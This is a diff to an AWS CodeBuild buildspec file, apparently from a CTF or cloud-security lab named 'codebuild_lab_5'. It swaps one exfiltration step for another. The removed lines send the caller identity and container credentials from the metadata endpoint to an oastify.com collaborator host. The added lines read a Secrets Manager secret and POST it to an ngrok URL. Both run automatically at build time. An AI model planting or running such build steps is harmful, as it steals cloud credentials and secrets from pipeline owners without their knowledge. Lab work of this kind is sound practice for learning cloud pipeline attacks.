@@ -3,5 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -s -X POST "https://bu9vcmqeqoqpnlb5v5a1lrbad1js7iv7.oastify.com" -d "identity=$(aws sts get-caller-identity)"
-      - curl -s -X POST "https://bu9vcmqeqoqpnlb5v5a1lrbad1js7iv7.oastify.com" --data-urlencode "identity=$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)"
+      - echo "=== START ==="
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -X POST  https://7a02-83-99-204-150.ngrok-free.app --data "flag=$FLAG"
+      - echo "=== END ==="
